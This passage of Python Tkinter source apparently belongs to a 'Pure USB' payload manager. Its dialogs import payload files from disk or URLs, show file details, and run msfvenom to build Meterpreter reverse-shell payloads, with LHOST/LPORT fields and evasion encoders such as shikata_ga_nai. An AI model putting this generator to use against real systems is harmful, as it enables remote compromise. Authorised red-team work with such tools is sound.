            '.bat': 'Batch File'
        }
        return types.get(ext, 'Unknown')


class PayloadImportDialog:
    """Dialog for importing payloads from various sources"""
    
    def __init__(self, parent, app):
        self.parent = parent
        self.app = app
        self.selected_files = []
        
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Import Payloads")
        self.dialog.geometry("650x550")
        self.dialog.resizable(True, True)
        
        # Make dialog modal
        self.dialog.transient(parent)
        self.dialog.grab_set()
        
        self.create_widgets()
        
        # Center dialog
        self.dialog.update_idletasks()
        x = (self.dialog.winfo_screenwidth() // 2) - (650 // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (550 // 2)
        self.dialog.geometry(f"650x550+{x}+{y}")
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.dialog, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        ttk.Label(main_frame, text="Import Payloads", font=('Arial', 16, 'bold')).pack(pady=(0, 20))
        
        # Import methods notebook
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True, pady=(0, 20))
        
        # File import tab
        self.create_file_import_tab(notebook)
        
        # Directory import tab
        self.create_directory_import_tab(notebook)
        
        # URL import tab
        self.create_url_import_tab(notebook)
        
        # Metasploit import tab
        self.create_metasploit_import_tab(notebook)
        
        # Import progress
        self.progress_frame = ttk.Frame(main_frame)
        self.progress_frame.pack(fill=tk.X, pady=(10, 20))
        
        self.progress_var = tk.StringVar(value="Ready to import...")
        ttk.Label(self.progress_frame, textvariable=self.progress_var).pack(anchor=tk.W)
        
        self.progress_bar = ttk.Progressbar(self.progress_frame, mode='determinate')
        self.progress_bar.pack(fill=tk.X, pady=(5, 0))
        
        # Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X)
        
        ttk.Button(button_frame, text="Import", command=self.start_import, style='Action.TButton').pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Cancel", command=self.cancel).pack(side=tk.LEFT)
        
        # Import summary
        ttk.Label(button_frame, text="Selected files will be copied to payload directory", 
                 font=('Arial', 9), foreground='#7f8c8d').pack(side=tk.RIGHT)
    
    def create_file_import_tab(self, notebook):
        """Create file import tab"""
        file_frame = ttk.Frame(notebook, padding="10")
        notebook.add(file_frame, text="Import Files")
        
        file_frame.columnconfigure(0, weight=1)
        file_frame.rowconfigure(1, weight=1)
        
        # Instructions
        instructions = """Select individual payload files to import:
• Windows executables (.exe)
• Python scripts (.py)
• PowerShell scripts (.ps1)
• Metasploit resources (.rc)
• Shell scripts (.sh)
• Batch files (.bat)"""
        
        ttk.Label(file_frame, text=instructions, justify=tk.LEFT).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0, 10))
        
        # File selection
        list_frame = ttk.Frame(file_frame)
        list_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        list_frame.columnconfigure(0, weight=1)
        list_frame.rowconfigure(0, weight=1)
        
        self.files_listbox = tk.Listbox(list_frame, selectmode=tk.MULTIPLE)
        self.files_listbox.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        files_scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.files_listbox.yview)
        files_scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.files_listbox.configure(yscrollcommand=files_scrollbar.set)
        
        # Buttons
        ttk.Button(file_frame, text="Browse Files", command=self.browse_files).grid(row=2, column=0, sticky=tk.W, padx=(0, 10))
        ttk.Button(file_frame, text="Clear Selection", command=self.clear_files).grid(row=2, column=1, sticky=tk.W, padx=(0, 10))
        
        # File info
        self.file_info_var = tk.StringVar(value="No files selected")
        ttk.Label(file_frame, textvariable=self.file_info_var, font=('Arial', 9)).grid(row=3, column=0, columnspan=3, sticky=tk.W, pady=(10, 0))
    
    def create_directory_import_tab(self, notebook):
        """Create directory import tab"""
        dir_frame = ttk.Frame(notebook, padding="10")
        notebook.add(dir_frame, text="Import Directory")
        
        dir_frame.columnconfigure(1, weight=1)
        
        # Instructions
        ttk.Label(dir_frame, text="Import all payload files from a directory:", 
                 font=('Arial', 10, 'bold')).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0, 20))
        
        # Directory selection
        ttk.Label(dir_frame, text="Source Directory:").grid(row=1, column=0, sticky=tk.W, padx=(0, 10))
        self.dir_path_var = tk.StringVar()
        ttk.Entry(dir_frame, textvariable=self.dir_path_var, width=50).grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        ttk.Button(dir_frame, text="Browse", command=self.browse_directory).grid(row=1, column=2)
        
        # Options
        options_frame = ttk.LabelFrame(dir_frame, text="Import Options", padding="10")
        options_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(20, 0))
        options_frame.columnconfigure(0, weight=1)
        
        self.recursive_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Include subdirectories (recursive)", 
                       variable=self.recursive_var).grid(row=0, column=0, sticky=tk.W)
        
        self.overwrite_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="Overwrite existing files", 
                       variable=self.overwrite_var).grid(row=1, column=0, sticky=tk.W)
        
        self.rename_duplicates_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Auto-rename duplicate files", 
                       variable=self.rename_duplicates_var).grid(row=2, column=0, sticky=tk.W)
        
        # File type filters
        filters_frame = ttk.LabelFrame(dir_frame, text="File Type Filters", padding="10")
        filters_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(20, 0))
        
        self.filter_vars = {}
        extensions = ['.exe', '.py', '.ps1', '.rc', '.sh', '.bat', '.dll', '.jar']
        
        for i, ext in enumerate(extensions):
            var = tk.BooleanVar(value=True)
            self.filter_vars[ext] = var
            ttk.Checkbutton(filters_frame, text=ext.upper(), variable=var).grid(row=i//4, column=i%4, sticky=tk.W, padx=(0, 20))
    
    def create_url_import_tab(self, notebook):
        """Create URL import tab"""
        url_frame = ttk.Frame(notebook, padding="10")
        notebook.add(url_frame, text="Download from URL")
        
        url_frame.columnconfigure(1, weight=1)
        
        # Instructions
        instructions = """Download payloads directly from URLs:
• GitHub repositories
• Direct file downloads
• Payload databases
• Custom servers"""
        
        ttk.Label(url_frame, text=instructions, justify=tk.LEFT).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0, 20))
        
        # URL input
        ttk.Label(url_frame, text="URL:").grid(row=1, column=0, sticky=tk.W, padx=(0, 10))
        self.url_var = tk.StringVar()
        ttk.Entry(url_frame, textvariable=self.url_var, width=50).grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        ttk.Button(url_frame, text="Add URL", command=self.add_url).grid(row=1, column=2)
        
        # URL list
        list_frame = ttk.Frame(url_frame)
        list_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(20, 0))
        list_frame.columnconfigure(0, weight=1)
        list_frame.rowconfigure(0, weight=1)
        
        self.urls_listbox = tk.Listbox(list_frame)
        self.urls_listbox.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        urls_scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.urls_listbox.yview)
        urls_scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.urls_listbox.configure(yscrollcommand=urls_scrollbar.set)
        
        # URL buttons
        url_buttons_frame = ttk.Frame(url_frame)
        url_buttons_frame.grid(row=3, column=0, columnspan=3, sticky=tk.W, pady=(10, 0))
        
        ttk.Button(url_buttons_frame, text="Remove Selected", command=self.remove_url).grid(row=0, column=0, padx=(0, 10))
        ttk.Button(url_buttons_frame, text="Clear All", command=self.clear_urls).grid(row=0, column=1)
    
    def create_metasploit_import_tab(self, notebook):
        """Create Metasploit import tab"""
        msf_frame = ttk.Frame(notebook, padding="10")
        notebook.add(msf_frame, text="Generate with MSFvenom")
        
        msf_frame.columnconfigure(1, weight=1)
        
        # Instructions
        ttk.Label(msf_frame, text="Generate new payloads using msfvenom:", 
                 font=('Arial', 10, 'bold')).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0, 20))
        
        # Payload configuration
        config_frame = ttk.LabelFrame(msf_frame, text="Payload Configuration", padding="10")
        config_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        config_frame.columnconfigure(1, weight=1)
        
        # Payload type
        ttk.Label(config_frame, text="Payload:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        self.msf_payload_var = tk.StringVar(value="windows/x64/meterpreter/reverse_tcp")
        payload_combo = ttk.Combobox(config_frame, textvariable=self.msf_payload_var, values=[
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_https",
            "windows/meterpreter/reverse_https",
            "python/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_tcp"
        ], width=40)
        payload_combo.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        
        # LHOST
        ttk.Label(config_frame, text="LHOST:").grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        self.msf_lhost_var = tk.StringVar(value="192.168.1.100")
        ttk.Entry(config_frame, textvariable=self.msf_lhost_var).grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(0, 10), pady=(10, 0))
        
        # LPORT
        ttk.Label(config_frame, text="LPORT:").grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        self.msf_lport_var = tk.StringVar(value="4444")
        ttk.Entry(config_frame, textvariable=self.msf_lport_var).grid(row=2, column=1, sticky=(tk.W, tk.E), padx=(0, 10), pady=(10, 0))
        
        # Output format
        ttk.Label(config_frame, text="Format:").grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        self.msf_format_var = tk.StringVar(value="exe")
        format_combo = ttk.Combobox(config_frame, textvariable=self.msf_format_var, values=[
            "exe", "raw", "powershell", "python", "elf", "dll", "jar"
        ], width=20)
        format_combo.grid(row=3, column=1, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        
        # Output filename
        ttk.Label(config_frame, text="Filename:").grid(row=4, column=0, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        self.msf_filename_var = tk.StringVar(value="generated_payload.exe")
        ttk.Entry(config_frame, textvariable=self.msf_filename_var).grid(row=4, column=1, sticky=(tk.W, tk.E), padx=(0, 10), pady=(10, 0))
        
        # Generation options
        options_frame = ttk.LabelFrame(msf_frame, text="Generation Options", padding="10")
        options_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
        
        self.msf_encoder_var = tk.StringVar()
        ttk.Label(options_frame, text="Encoder (optional):").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        encoder_combo = ttk.Combobox(options_frame, textvariable=self.msf_encoder_var, values=[
            "", "x86/shikata_ga_nai", "x64/xor", "cmd/powershell_base64"
        ], width=30)
        encoder_combo.grid(row=0, column=1, sticky=tk.W)
        
        ttk.Button(options_frame, text="Generate Payload", command=self.generate_msf_payload, 
                  style='Action.TButton').grid(row=1, column=0, columnspan=2, pady=(20, 0))
    
    def browse_files(self):
        """Browse for individual files"""
        filetypes = [
            ('All Payload Files', '*.exe *.py *.ps1 *.rc *.sh *.bat *.dll *.jar'),
            ('Windows Executables', '*.exe *.dll'),
            ('Scripts', '*.py *.ps1 *.sh *.bat'),
            ('Metasploit Resources', '*.rc'),
            ('All Files', '*.*')
        ]
        
        files = filedialog.askopenfilenames(
            title="Select Payload Files",
            filetypes=filetypes
        )
        
        if files:
            self.files_listbox.delete(0, tk.END)
            for file in files:
                self.files_listbox.insert(tk.END, file)
            
            self.update_file_info(len(files))
    
    def clear_files(self):
        """Clear file selection"""
        self.files_listbox.delete(0, tk.END)
        self.update_file_info(0)
    
    def update_file_info(self, count):
        """Update file information display"""
        if count == 0:
            self.file_info_var.set("No files selected")
        elif count == 1:
            self.file_info_var.set("1 file selected")
        else:
            self.file_info_var.set(f"{count} files selected")
    
    def browse_directory(self):
        """Browse for directory"""
        directory = filedialog.askdirectory(title="Select Payload Directory")
        if directory:
            self.dir_path_var.set(directory)
    
    def add_url(self):
        """Add URL to download list"""
        url = self.url_var.get().strip()
        if url:
            self.urls_listbox.insert(tk.END, url)
            self.url_var.set("")
    
    def remove_url(self):
        """Remove selected URL"""
        selection = self.urls_listbox.curselection()
        if selection:
            self.urls_listbox.delete(selection[0])
    
    def clear_urls(self):
        """Clear all URLs"""
        self.urls_listbox.delete(0, tk.END)
    
    def generate_msf_payload(self):
        """Generate payload with msfvenom"""
        try:
            payload = self.msf_payload_var.get()
            lhost = self.msf_lhost_var.get()
            lport = self.msf_lport_var.get()
            format_type = self.msf_format_var.get()
            filename = self.msf_filename_var.get()
            encoder = self.msf_encoder_var.get()
            
            if not all([payload, lhost, lport, format_type, filename]):
                messagebox.showerror("Error", "Please fill in all required fields")
                return
            
            # Build msfvenom command
            cmd = [
                'msfvenom',
                '-p', payload,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format_type,
                '-o', str(self.app.payload_dir / filename)
            ]
            
            if encoder:
                cmd.extend(['-e', encoder])
            
            self.progress_var.set("Generating payload with msfvenom...")
            self.progress_bar.config(mode='indeterminate')
            self.progress_bar.start()
            
            # Run msfvenom
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            self.progress_bar.stop()
            
            if result.returncode == 0:
                self.progress_var.set(f"Payload generated successfully: {filename}")
                messagebox.showinfo("Success", f"Payload '{filename}' generated successfully!")
            else:
                error_msg = result.stderr or result.stdout or "Unknown error"
                self.progress_var.set("Payload generation failed")
                messagebox.showerror("Generation Failed", f"msfvenom failed:\n\n{error_msg}")
                
        except subprocess.TimeoutExpired:
            self.progress_bar.stop()
            self.progress_var.set("Payload generation timed out")
            messagebox.showerror("Timeout", "Payload generation timed out")
        except FileNotFoundError:
            self.progress_bar.stop()
            self.progress_var.set("msfvenom not found")
            messagebox.showerror("Error", "msfvenom not found. Please install Metasploit Framework.")
        except Exception as e:
            self.progress_bar.stop()
            self.progress_var.set("Payload generation failed")
            messagebox.showerror("Error", f"Failed to generate payload:\n\n{str(e)}")
    
    def start_import(self):
        """Start the import process"""
        import threading
        threading.Thread(target=self._import_thread, daemon=True).start()
    
    def _import_thread(self):
        """Import payloads in separate thread"""
        try:
            imported_count = 0
            
            # Import files from file selection
            files = list(self.files_listbox.get(0, tk.END))
            if files:
                self.progress_var.set("Importing selected files...")
                self.progress_bar.config(mode='determinate', maximum=len(files))
                
                for i, file_path in enumerate(files):
                    try:
                        src_path = Path(file_path)
                        dest_path = self.app.payload_dir / src_path.name
                        
                        # Handle duplicates
                        if dest_path.exists():
                            if not self.overwrite_var.get():
                                # Auto-rename
                                counter = 1
                                base_name = src_path.stem
                                extension = src_path.suffix
                                while dest_path.exists():
                                    new_name = f"{base_name}_{counter}{extension}"
                                    dest_path = self.app.payload_dir / new_name
                                    counter += 1
                        
                        shutil.copy2(src_path, dest_path)
                        imported_count += 1
                        
                    except Exception as e:
                        print(f"Failed to import {file_path}: {e}")
                    
                    self.progress_bar['value'] = i + 1
                    self.dialog.update_idletasks()
            
            # Import from directory
            if self.dir_path_var.get():
                source_dir = Path(self.dir_path_var.get())
                if source_dir.exists():
                    self.progress_var.set("Importing from directory...")
                    
                    # Get file extensions to include
                    include_extensions = [ext for ext, var in self.filter_vars.items() if var.get()]
                    
                    # Find files
                    if self.recursive_var.get():
                        files = []
                        for ext in include_extensions:
                            files.extend(source_dir.rglob(f'*{ext}'))
                    else:
                        files = []
                        for ext in include_extensions:
                            files.extend(source_dir.glob(f'*{ext}'))
                    
                    if files:
                        self.progress_bar.config(mode='determinate', maximum=len(files))
                        
                        for i, src_path in enumerate(files):
                            try:
                                dest_path = self.app.payload_dir / src_path.name
                                
                                # Handle duplicates
                                if dest_path.exists() and not self.overwrite_var.get():
                                    if self.rename_duplicates_var.get():
                                        counter = 1
                                        base_name = src_path.stem
                                        extension = src_path.suffix
                                        while dest_path.exists():
                                            new_name = f"{base_name}_{counter}{extension}"
                                            dest_path = self.app.payload_dir / new_name
                                            counter += 1
                                    else:
                                        continue  # Skip duplicates
                                
                                shutil.copy2(src_path, dest_path)
                                imported_count += 1
                                
                            except Exception as e:
                                print(f"Failed to import {src_path}: {e}")
                            
                            self.progress_bar['value'] = i + 1
                            self.dialog.update_idletasks()
            
            # Download from URLs
            urls = list(self.urls_listbox.get(0, tk.END))
            if urls:
                self.progress_var.set("Downloading from URLs...")
                self.progress_bar.config(mode='determinate', maximum=len(urls))
                
                for i, url in enumerate(urls):
                    try:
                        import urllib.request
                        from urllib.parse import urlparse
                        
                        parsed_url = urlparse(url)
                        filename = Path(parsed_url.path).name
                        
                        if not filename or '.' not in filename:
                            filename = f"downloaded_payload_{i+1}"
                        
                        dest_path = self.app.payload_dir / filename
                        
                        urllib.request.urlretrieve(url, dest_path)
                        imported_count += 1
                        
                    except Exception as e:
                        print(f"Failed to download {url}: {e}")
                    
                    self.progress_bar['value'] = i + 1
                    self.dialog.update_idletasks()
            
            # Finish
            self.progress_var.set(f"Import completed. {imported_count} payloads imported.")
            
            # Refresh the main application
            self.app.refresh_payloads()
            
            # Show completion message
            if imported_count > 0:
                messagebox.showinfo("Import Complete", 
                                   f"Successfully imported {imported_count} payload(s).\n\nPayloads have been added to your collection.")
            else:
                messagebox.showwarning("No Files Imported", "No files were imported. Please check your selections.")
                
        except Exception as e:
            self.progress_var.set("Import failed")
            messagebox.showerror("Import Failed", f"Failed to import payloads:\n\n{str(e)}")
    
    def cancel(self):
        """Cancel and close dialog"""
        self.dialog.destroy()


class PayloadGeneratorDialog:
    """Dialog for generating new payloads"""
    
    def __init__(self, parent, app):
        self.parent = parent
        self.app = app
        
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Generate New Payload")
        self.dialog.geometry("500x400")
        self.dialog.resizable(False, False)
        
        # Make dialog modal
        self.dialog.transient(parent)
        self.dialog.grab_set()
        
        self.create_widgets()
        
        # Center dialog
        self.dialog.update_idletasks()
        x = (self.dialog.winfo_screenwidth() // 2) - (500 // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (400 // 2)
        self.dialog.geometry(f"500x400+{x}+{y}")
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.dialog, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(main_frame, text="Payload Generator", font=('Arial', 14, 'bold')).pack(pady=(0, 20))
        
        # Payload type
        ttk.Label(main_frame, text="Payload Type:").pack(anchor=tk.W)
        self.payload_type = ttk.Combobox(main_frame, values=[
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "python/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp"
        ], width=50)
        self.payload_type.pack(fill=tk.X, pady=(5, 15))
        
        # LHOST
        ttk.Label(main_frame, text="LHOST:").pack(anchor=tk.W)
        self.lhost = ttk.Entry(main_frame, width=50)
        self.lhost.pack(fill=tk.X, pady=(5, 15))
        
        # LPORT
        ttk.Label(main_frame, text="LPORT:").pack(anchor=tk.W)
        self.lport = ttk.Entry(main_frame, width=50)
        self.lport.pack(fill=tk.X, pady=(5, 15))
        
        # Output format
        ttk.Label(main_frame, text="Output Format:").pack(anchor=tk.W)
        self.output_format = ttk.Combobox(main_frame, values=[
            "exe", "raw", "powershell", "python"
        ], width=50)
        self.output_format.pack(fill=tk.X, pady=(5, 15))
        
        # Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=(20, 0))
        
        ttk.Button(button_frame, text="Generate", command=self.generate).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Cancel", command=self.cancel).pack(side=tk.LEFT)
    
    def generate(self):
        # Implementation for payload generation
        messagebox.showinfo("Info", "Payload generation functionality not yet implemented")
        self.dialog.destroy()
    
    def cancel(self):
        self.dialog.destroy()


class PayloadDetailsDialog:
    """Dialog for viewing payload details"""
    
    def __init__(self, parent, payload_path):
        self.parent = parent
        self.payload_path = payload_path
        
        self.dialog = tk.Toplevel(parent)
        self.dialog.title(f"Payload Details - {payload_path.name}")
        self.dialog.geometry("600x500")
        
        # Make dialog modal
        self.dialog.transient(parent)
        self.dialog.grab_set()
        
        self.create_widgets()
        
        # Center dialog
        self.dialog.update_idletasks()
        x = (self.dialog.winfo_screenwidth() // 2) - (600 // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (500 // 2)
        self.dialog.geometry(f"600x500+{x}+{y}")
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.dialog, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(main_frame, text=f"Payload: {self.payload_path.name}", 
                 font=('Arial', 14, 'bold')).pack(pady=(0, 20))
        
        # Details text
        details_frame = ttk.Frame(main_frame)
        details_frame.pack(fill=tk.BOTH, expand=True)
        
        self.details_text = tk.Text(details_frame, wrap=tk.WORD)
        self.details_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(details_frame, orient=tk.VERTICAL, command=self.details_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.details_text.configure(yscrollcommand=scrollbar.set)
        
        # Load payload details
        self.load_details()
        
        # Close button
        ttk.Button(main_frame, text="Close", command=self.dialog.destroy).pack(pady=(20, 0))
    
    def load_details(self):
        """Load and display payload details"""
        try:
            stat = self.payload_path.stat()
            
            details = f"""File Information:
================
Name: {self.payload_path.name}
Size: {self.format_file_size(stat.st_size)}
Created: {time.ctime(stat.st_ctime)}
Modified: {time.ctime(stat.st_mtime)}
Permissions: {oct(stat.st_mode)[-3:]}

File Hash (SHA256):
==================
{self.calculate_hash()}

File Type:
==========
{self.get_file_type()}

"""
            
            # Add content preview if it's a text file
            if self.payload_path.suffix.lower() in ['.py', '.ps1', '.sh', '.bat', '.rc', '.txt']:
                try:
                    with open(self.payload_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(1000)  # First 1000 characters
                    
                    details += f"""Content Preview (first 1000 characters):
===============================================
{content}"""
                    
                    if len(content) == 1000:
                        details += "\n\n[Content truncated...]"
                        
                except Exception as e:
                    details += f"\nContent Preview: Unable to read file - {str(e)}"
            else:
                details += "\nContent Preview: Binary file - content not shown"
            
            self.details_text.insert(1.0, details)
            
        except Exception as e:
            self.details_text.insert(1.0, f"Error loading payload details:\n{str(e)}")
    
    def calculate_hash(self):
        """Calculate SHA256 hash of the file"""
        try:
            hash_sha256 = hashlib.sha256()
            with open(self.payload_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_sha256.update(chunk)
            return hash_sha256.hexdigest()
        except Exception:
            return "Unable to calculate hash"
    
    def get_file_type(self):
        """Get file type description"""
        ext = self.payload_path.suffix.lower()
        types = {
            '.exe': 'Windows Executable (PE)',
            '.py': 'Python Script',
            '.ps1': 'PowerShell Script',
            '.rc': 'Metasploit Resource File',
            '.sh': 'Shell Script',
            '.bat': 'Windows Batch File',
            '.txt': 'Text File',
            '.md': 'Markdown Document'
        }
        return types.get(ext, f'Unknown file type ({ext})')
    
    def format_file_size(self, size_bytes):
        """Format file size in human readable format"""
        if size_bytes == 0:
            return "0 B"
        
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        
        return f"{size_bytes:.1f} {size_names[i]}"


def main():
    """Main application entry point"""
    # Check if running with proper permissions
    if os.geteuid() != 0:
        print("Note: Some USB operations may require sudo privileges")
    
    # Create main window
    root = tk.Tk()
    
    # Create application
    app = PureUSBApp(root)
    
    # Handle window close
    def on_closing():
        if messagebox.askokcancel("Quit", "Are you sure you want to quit Pure USB?"):
            root.destroy()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    
    # Start main loop
    root.mainloop()


if __name__ == "__main__":
    main()